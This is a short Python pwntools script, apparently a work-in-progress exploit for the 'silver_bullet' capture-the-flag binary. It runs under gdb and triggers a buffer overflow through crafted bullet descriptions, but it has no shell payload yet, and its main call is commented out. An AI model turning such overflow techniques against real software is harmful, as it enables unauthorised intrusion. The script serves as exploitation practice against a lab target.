from pwn import *

libc = ELF('libc_32.so.6')
silver_bullet = ELF('silver_bullet')


class Prompts:
    CHOICE = 'Your choice :'
    BULLET_DESCRIPTION = 'Give me your description of bullet :'
    ANOTHER_BULLET_DESCRIPTION = 'Give me your another description of bullet :'


class Choices:
    CREATE_BULLET = '1'
    POWER_UP = '2'
    BEAT = '3'
    EXIT = '4'


def set_initial_power():
    print('[*] Initializing bullet description while keeping the power at zero.')
    p.sendafter(Prompts.CHOICE, Choices.CREATE_BULLET)
    p.sendafter(Prompts.BULLET_DESCRIPTION, '\0' + 'A' * 0x2a)
    p.sendafter(Prompts.CHOICE, Choices.CREATE_BULLET)
    p.sendafter(Prompts.BULLET_DESCRIPTION, 'A')


def power_up():
    print('[*] Powering up.')
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, 'A' * 0x3c)


def beat():
    p.sendafter(Prompts.CHOICE, Choices.BEAT)


p = gdb.debug(
    silver_bullet.path,
    '''
    b *main+0x5b
    b *main+0x69
    b *main+0x7b
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def main():
    set_initial_power()
    power_up()
    beat()


if __name__ == "__main__":
    pass
    # main()
